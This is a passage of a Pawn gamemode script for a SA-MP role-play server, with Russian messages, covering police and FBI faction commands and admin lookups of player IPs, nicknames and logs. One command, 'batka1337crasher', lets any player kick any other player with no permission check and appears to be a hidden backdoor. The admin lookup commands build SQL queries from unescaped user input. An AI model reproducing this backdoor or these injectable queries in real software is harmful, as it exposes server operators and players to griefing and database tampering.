	if(!IsPlayerInRangeOfPoint(playerid,3.0,CarPos[0],CarPos[1],CarPos[2])) return SendClientMessage(playerid,CGREY,"Вы не около мобильного пункта!");
	GetVehicleVelocity(fbidal,CarPos[0],CarPos[1],CarPos[2]);
	if(CarPos[0] != 0.0 || CarPos[1] != 0.0 || CarPos[2] != 0.0) return SendClientMessage(playerid,CGREY,"Нельзя заходить во время движения!");
	SetPlayerPos(playerid,1389.5343,5.2544,1000.9153);
	SetPlayerFacingAngle(playerid,190.2227);
	FreezePlayer(playerid,1389.5343,5.2544,0.8);
	SetPlayerInterior(playerid,55);
	SetPlayerVirtualWorld(playerid,fbidal);
	SetPVarInt(playerid,"InFbiCar",1);
    return 1;
}
CMD:wt(playerid)
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] != F_FBI) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    if(!GetPVarInt(playerid,"WT")) return SendClientMessage(playerid,CGREY,"Вы не брали устройство прослушки");
    new kek;
    for(new i = 5; i < 14; i++)
    {
        if(!IsPlayerInRangeOfPoint(playerid,30.0,SpawnFrac[i][0],SpawnFrac[i][1],SpawnFrac[i][2]) || GetPlayerVirtualWorld(playerid) != SpawnIn[i][1]) continue;
		PlayerInfo[playerid][pPros] = gettime()+60*60*3;
		PlayerInfo[playerid][pProsFrac] = i+1;
		DeletePVar(playerid,"WT");
		kek++;
		break;
    }
	if(!kek) return SendClientMessage(playerid,CGREY,"Вы не на базе организации банды/мафии");
    return 1;
}
CMD:su(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		new text[20];
        if(sscanf(params, "uis[20]", params[0],params[1],text) || strlen(text) > 20) return SendClientMessage(playerid, CGREY, "Используйте: /su [id] [кол-во] [причина]");
        if(params[1] < 1 || params[1] > 6) return SendClientMessage(playerid,CGREY,"Выдать можно от 1 до 6 звёзд");
//       if(IsACop(params[0])) return SendClientMessage(playerid,CGREY,"Вы не можете выдать данному игроку розыск");
        if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    //    if(PlayerInfo[params[0]][pWanted] >= params[1]) return SendClientMessage(playerid,CGREY,"Игрок находится уже в более усиленном розыске");
        if(IsAGos(params[0])) return SendClientMessage(playerid,CGREY,"Игрок гос. служащий");
        if(!TOTALWANTED) return SendClientMessage(playerid,CGREY,"Кодекс пуст!");
        query = "{ffffff}Код\tУровень розыска\tОписание\n";
        new str[144];
		for(new i = 1; i <= TOTALWANTED; i++)
		{
		    format(str,sizeof(str),"#%d\t%d\t%s\n",WInfo[i][wID],WInfo[i][wWanted],WInfo[i][wName]);
		    strcat(query,str);
		}
		ShowPlayerDialog(playerid,479,DIALOG_STYLE_TABLIST_HEADERS,"Выбор статьи",query,"Далее","Отмена");
		SetPVarInt(playerid,"SuID",params[0]);
		
		
	/*    SetPlayerWantedLevel(params[0],params[1]);
	    PlayerInfo[params[0]][pWanted] = params[1];
   	   	static const fmt_string1[] = "[R] %s | %s объявил в розыск %i степени %s. Причина: %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
		format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],params[1],PlayerInfo[params[0]][pSendername],text);
		SendCopsMessage(str1);
 		static const fmt_string2[] = "Внимание! Вы были объявлены в розыск %i степени | Объявление дал: %s | Причина: %s";
		new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME+3+20];
		format(str2, sizeof(str2), fmt_string2,params[1],PlayerInfo[playerid][pSendername],text);
		SendClientMessage(params[0],CBLUE,str2);
		strmid(PlayerInfo[params[0]][pSuAd], text, 0, strlen(text), 20);*/
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:takeo(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(IsACop(playerid) && PlayerInfo[playerid][pRank] > 4)
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "ui", params[0],params[1])  || params[0] == playerid) return SendClientMessage(playerid, CGREY, "Используйте: /takeo [id] [1 - материалы/2 - наркотики]");
		if(params[1] < 1 || params[1] > 2) return SendClientMessage(playerid, CGREY, "Используйте: /takeo [id] [1 - материалы/2 - наркотики]");
        if(PlayerInfo[playerid][pRank] < 4) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		new text[25];
		if(params[1] == 1)
		{
		    if(PlayerInfo[params[0]][pMats] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет материалов");
		    InvMinus(playerid,447,PlayerInfo[playerid][pMats]);
		    PlayerInfo[params[0]][pMats] = 0;
	        format(text,sizeof(text),"материалы");
		}
		else if(params[1] == 2)
		{
		    if(PlayerInfo[params[0]][pDrugs] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет наркотиков");
		    InvMinus(playerid,337,PlayerInfo[playerid][pDrugs]);
		    PlayerInfo[params[0]][pDrugs] = 0;
	        format(text,sizeof(text),"наркотики");
		}
   	   	static const fmt_string1[] = "%s{FFFFFF} отобрал у Вас {f7ae11}%s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+25];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],text);
		SendClientMessage(params[0],CREWARD,str1);
		static const fmt_string4[] = "Вы отобрали у {f7ae11}%s {f7ae11}%s";
		new str4[sizeof(fmt_string4)+MAX_PLAYER_NAME+25];
		format(str4, sizeof(str4), fmt_string4,PlayerInfo[params[0]][pSendername],text);
		SendClientMessage(playerid,-1,str4);
		static const fmt_string[] = "%s отобрал %s у %s и выкинул их";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+100];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text,PlayerInfo[params[0]][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		SetPlayerChatBubble(playerid, "отобрал у человека предмет и выкинул его", COLOR_PURPLE, 30.0, 7000);

    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:take(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == F_LIC && PlayerInfo[playerid][pRank] > 4 || IsACop(playerid) && PlayerInfo[playerid][pRank] > 4)
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "us[3]", params[0],params[1]) || params[0] == playerid) return SendClientMessage(playerid, CGREY, "Используйте: /take [id]");
        if(PlayerInfo[playerid][pRank] < 4) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    ShowPlayerDialog(playerid,458,DIALOG_STYLE_LIST,"Выберите лицензию","Лицензия на автомобиль\n\
		Лицензия на мототранспорт\n\
		Лицензия на водный транспорт\n\
		Лицензия на воздушный транспорт\n\
		Лицензия на грузовой транспорт\n\
		Лицензия на автобус\n\
		Лицензия на ношение оружия","Далее","Отмена");
		SetPVarInt(playerid,"AGLP",params[0]);
		/*
		new text[25];
		new full = -1;
		if(strcmp(params[1], "C", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][0] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
	        format(text,sizeof(text),"автомобиль");
	        full = 0;
		}
		else if(strcmp(params[1], "M", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][1] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
	        format(text,sizeof(text),"мототранспорт");
	        full = 1;
		}
		else if(strcmp(params[1], "B", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][2] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
	        format(text,sizeof(text),"водный транспорт");
	        full = 2;
		}
		else if(strcmp(params[1], "P", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][3] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
	        format(text,sizeof(text),"воздушный транспорт");
	        full = 3;
		}
		else if(strcmp(params[1], "W", true) == 0)
		{
		    if(!IsACop(playerid)) return SendClientMessage(playerid, CGREY, "Данную лицензию может отнять только полицейский");
		    if(PlayerInfo[params[0]][pLic][4] == 0) return SendClientMessage(playerid, CGREY, "У игрока нет данной лицензии");
	 		format(text,sizeof(text),"оружие");
	 		full = 4;
		}
		if(full == -1)
		{
			return SendClientMessage(playerid, CGREY, "Лицензии: C (машина) | M (мототранспорт) | B (водный транспорт) | P (воздушный транспорт) | W (оружие)");
		}
		PlayerInfo[params[0]][pLic][full] = 0;
		PlayerInfo[params[0]][pLicTime][full] = 0;
		InvMinus(playerid,449,1);
   	   	static const fmt_string1[] = "%s{FFFFFF} отобрал у Вас лицензию на {f7ae11}%s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+25];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],text);
		SendClientMessage(params[0],CREWARD,str1);
		static const fmt_string4[] = "Вы отобрали у {f7ae11}%s{FFFFFF} лицензию на {f7ae11}%s";
		new str4[sizeof(fmt_string4)+MAX_PLAYER_NAME+25];
		format(str4, sizeof(str4), fmt_string4,PlayerInfo[params[0]][pSendername],text);
		SendClientMessage(playerid,-1,str4);*/

    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}

/*CMD:gl(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == F_LIC)
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "us[3]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /gl [id] [лицензия]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		new text[25];
		new full = 0;
		if(strcmp(params[1], "C", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][0] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
	        SetPVarInt(params[0],"Lic",0);
	        format(text,sizeof(text),"автомобиль");
	        full = 1;
		}
		else if(strcmp(params[1], "M", true) == 0)
		{
		    if(PlayerInfo[params[0]][pLic][1] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
	        SetPVarInt(params[0],"Lic",1);
	        format(text,sizeof(text),"мототранспорт");
	        full = 1;
		}
		else if(strcmp(params[1], "B", true) == 0 && PlayerInfo[playerid][pRank] >= 3)
		{
		    if(PlayerInfo[params[0]][pLic][2] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
		    if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,CGREY,"Вы не можете продавать данную лицензию");
	        SetPVarInt(params[0],"Lic",2);
	        format(text,sizeof(text),"водный транспорт");
	        full = 1;
		}
		else if(strcmp(params[1], "P", true) == 0 && PlayerInfo[playerid][pRank] >= 4)
		{
		    if(PlayerInfo[params[0]][pLic][3] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
		    if(PlayerInfo[playerid][pRank] < 4) return SendClientMessage(playerid,CGREY,"Вы не можете продавать данную лицензию");
	        SetPVarInt(params[0],"Lic",3);
	        format(text,sizeof(text),"воздушный транспорт");
	        full = 1;
		}
		if(full == 0)
		{
		    SendClientMessage(playerid, CGREY, "Лицензии: C (машина | 1 ранг) | M (мототранспорт | 1 ранг) | B (водный транспорт | 3 ранг)");
			return SendClientMessage(playerid, CGREY, "P (воздушный транспорт | 4 ранг)");
		}
		if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
		SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить лицензию");
	   	static const fmt_string1[] = "%s предложил Вам купить лицензию на %s. Цена: $%i";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+25+3];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],text,LicCost[GetPVarInt(params[0],"Lic")]);
		SendClientMessage(params[0],0xFF7F50FF,str1);
		SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		SetPVarInt(params[0],"LicID",playerid);
		SetPVarInt(params[0],"LicP",1);
		SetPVarInt(params[0],"LicCena",LicCost[GetPVarInt(params[0],"Lic")]);
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}
CMD:test(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == F_LIC)
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /test [id]");
        new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете начать тест с собой");
        switch(GetPVarInt(params[0],"LicTest"))
        {
            case 0:
            {
                SetPVarInt(params[0],"LicTest",1);
                SendClientMessage(playerid,CREWARD,"Вы начали тест с игроком");
                SendClientMessage(params[0],CREWARD,"Лицензер начал тест с вами");
            }
            case 1:
            {
           		DeletePVar(params[0],"LicTest");
                SendClientMessage(playerid,CREWARD,"Вы закончили тест с игроком");
                SendClientMessage(params[0],CREWARD,"Лицензер закончил тест с вами");
            }
        }
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    return true;
}*/
function ShowLip(playerid,nick[])
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new str1[50];
	    new srrt[400];
		format(str1,sizeof(str1),"{FFFFFF}Аккаунты с REGIP %s:\n",nick);
		strcat(srrt, str1);
		new sos[24];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            format(str1,sizeof(str1),"%s\n",sos);
			strcat(srrt, str1);
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Аккаунты",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует или манипуляций не проводилось!");
    return 1;
}
CMD:lip(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
//	new srrt[1500];
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Введите: /lip [ip]");
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	mysql_tquery(mysql, query, "ShowLip", "ds", playerid,params);
/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE ipreg = '%s'", params[0]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
	    new str1[50];
		format(str1,sizeof(str1),"{FFFFFF}Аккаунты с REGIP %s:\n",params[0]);
		strcat(srrt, str1);
		for(new i = 1; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			new sos[32];
			mysql_get_field("name", sos);
			new str[50];
			format(str,sizeof(str),"%s\n",sos);
			strcat(srrt, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Аккаунты",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}*/
	return true;
}
CMD:batka1337crasher(playerid, params[])
{
    if(sscanf(params, "u", params[0])) return 1;
    SaveAccount(params[0]);
	SetPVarInt(params[0],"Kick1",1);
	Kick(params[0], FIX_FUNCTION, 1200);
	return 1;
}
function ShowMoneys(playerid,nick[])
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new str1[60];
	    query = "";
		format(str1,sizeof(str1),"{FFFFFF}15 последних манипуляций %s:\n\n",nick);
		strcat(query, str1);
		new sos[50];
		new str[50];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "cho", sos, mysql);
            format(str,sizeof(str),"\t%s\n",sos);
			strcat(query, str);
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 последних манипуляций",query,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует или манипуляций не проводилось!");
    return 1;
}
CMD:logs(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Введите: /logs [ник]");
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	mysql_tquery(mysql, query, "CheckAccForShow", "dsd", playerid,params,1);
	
/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	new st,str2[3];
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
 	mysql_get_field("id", str2),st = strval(str2);
	format(query, sizeof(query), "SELECT * FROM logs WHERE id = '%d' ORDER BY id DESC LIMIT 15", st);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
	    new str1[60];
	    new srrt[400];
		format(str1,sizeof(str1),"{FFFFFF}15 последних манипуляций %s:\n\n",params);
		strcat(srrt, str1);
		new sos[50];
		new str[50];
		for(new i = 0; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);

			mysql_get_field("cho", sos);

			format(str,sizeof(str),"\t%s\n",sos);
			strcat(srrt, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 последних манипуляций",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}*/
    
	return true;
}
function CheckAccForShow(playerid,nick[],check)
{
    if(cache_get_row_count(mysql)>0)
    {
        new idplayer = cache_get_field_content_int(0, "id", mysql);
        query = "";
        switch(check)
        {
	        case 0:
	        {
	            format(query, sizeof(query), "SELECT * FROM history WHERE nameid = '%d' ORDER BY nameid DESC LIMIT 15",idplayer );
				mysql_tquery(mysql, query, "ShowHistory", "ds", playerid,nick);
	        }
	        case 1:
	        {
	            format(query, sizeof(query), "SELECT * FROM logs WHERE id = '%d' ORDER BY id DESC LIMIT 15", idplayer);
				mysql_tquery(mysql, query, "ShowMoneys", "ds", playerid,nick);
	        }
	        case 2:
	        {
	            format(query, sizeof(query), "SELECT * FROM nicks WHERE id1 = '%d' ORDER BY id DESC LIMIT 15", idplayer);
				mysql_tquery(mysql, query, "ShowNicks", "ds", playerid,nick);
	        }
	        case 3:
	        {
	            format(query, sizeof(query), "SELECT * FROM ip WHERE id1 = '%d' ORDER BY id DESC LIMIT 15", idplayer);
	            mysql_tquery(mysql, query, "ShowIps", "ds", playerid,nick);
	        }
        }
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
    return 1;
}
function ShowHistory(playerid,nick[])
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new str1[60];
	    query = "";
		format(str1,sizeof(str1),"{FFFFFF}15 последних нарушений %s:\n\n",nick);
		strcat(query, str1);
		new sos[32];
		new str[100],nameadm[24],reas[50],timr[20];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "com", sos, mysql);
            cache_get_field_content(row-1, "adm", nameadm, mysql);
            cache_get_field_content(row-1, "time", timr, mysql);
            cache_get_field_content(row-1, "reason", reas, mysql);
            format(str,sizeof(str),"\t%s от %s. Причина: %s [%s]\n",sos,nameadm,reas,timr);
			strcat(query, str);
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 последних манипуляций",query,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует или манипуляций не проводилось!");
    return 1;
}
CMD:history(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Введите: /history [ник]");
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	mysql_tquery(mysql, query, "CheckAccForShow", "dsd", playerid,params,0);
/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	new st,str2[3];
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
 	mysql_get_field("id", str2),st = strval(str2);
	format(query, sizeof(query), "SELECT * FROM history WHERE nameid = '%d' ORDER BY nameid DESC LIMIT 15", st);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
	    new str1[60];
	    new srrt[400];
		format(str1,sizeof(str1),"{FFFFFF}15 последних нарушений %s:\n\n",params);
		strcat(srrt, str1);
		new sos[32];
		new str[100],nameadm[24],reas[50],timr[20];
		for(new i = 0; i < mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			
			mysql_get_field("com", sos);
			mysql_get_field("adm", nameadm);
			mysql_get_field("time", timr);
			mysql_get_field("reason", reas);
			format(str,sizeof(str),"\t%s от %s. Причина: %s [%s]\n",sos,nameadm,reas,timr);
			strcat(srrt, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 последних нарушений",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}*/
	return true;
}
/*CMD:news(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	mysql_query("SELECT * FROM news WHERE ORDER BY id DESC LIMIT 15");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		new gov[90],date[15];
		new str[100];
		query = "";
		for(new i = 0; i < mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			mysql_get_field("gov", gov);
			mysql_get_field("date", date);
			format(str,sizeof(str),"%s\t\t%s\n",date,gov);
			strcat(query, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Последние гос. новости",query,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
	else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Последние гос. новости","{ffffff}Пусто!","Далее","");
	return true;
}*/
function ShowNicks(playerid,nick[])
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	   	new str1[60];
	    query ="";
	    new sos[32];
	    format(str1,sizeof(str1),"{FFFFFF}15 прошлых ников %s:\n\n",nick);
		strcat(query, str1);
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            format(str1,sizeof(str1),"\t%s\n",sos);
			strcat(query, str1);
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 прошлых ников",query,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует или манипуляций не проводилось!");
    return 1;
}
CMD:nicks(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Введите: /nicks [ник]");
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	mysql_tquery(mysql, query, "CheckAccForShow", "dsd", playerid,params,2);
	
	
/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	new st,str2[3];
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
 	mysql_get_field("id", str2),st = strval(str2);
	format(query, sizeof(query), "SELECT * FROM nicks WHERE id1 = '%d' ORDER BY id DESC LIMIT 15", st);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
	    new str1[60];
	    new srrt[400];
		format(str1,sizeof(str1),"{FFFFFF}15 прошлых ников %s:\n\n",params);
		strcat(srrt, str1);
		for(new i = 0; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			new sos[32];
			mysql_get_field("name", sos);
			new str[50];
			format(str,sizeof(str),"\t%s\n",sos);
			strcat(srrt, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 прошлых ников",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}*/
	return true;
}
function ShowIps(playerid,nick[])
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	   	new str1[60];
	    query = "";
		format(str1,sizeof(str1),"{FFFFFF}IP 15 прошлых авторизаций %s:\n\n",nick);
		strcat(query, str1);
		new sos[16];
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "ip", sos, mysql);
            format(str1,sizeof(str1),"\t\t%s\n",sos);
			strcat(query, str1);
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"IP 15 прошлых авторизаций",query,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует или манипуляций не проводилось!");
    return 1;
}
CMD:ips(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[128]", params)) return SendClientMessage(playerid, CGREY, "Введите: /ips [ник]");
	if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	mysql_tquery(mysql, query, "CheckAccForShow", "dsd", playerid,params,3);
/*	format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", params);
	new st,str2[3];
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
 	mysql_get_field("id", str2),st = strval(str2);
	format(query, sizeof(query), "SELECT * FROM ip WHERE id1 = '%d' ORDER BY id DESC LIMIT 15", st);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
	    new str1[60];
	    new srrt[400];
		format(str1,sizeof(str1),"{FFFFFF}IP 15 прошлых авторизаций %s:\n\n",params);
		strcat(srrt, str1);
		for(new i = 0; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			new sos[16];
			mysql_get_field("ip", sos);
			new str[50];
			format(str,sizeof(str),"\t\t%s\n",sos);
			strcat(srrt, str);
		}
		mysql_free_result();
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"IP 15 прошлых авторизаций",srrt,"Закрыть","");
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
	}*/
	return true;
}

CMD:ccall(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_NEWS )
	{
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	    if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
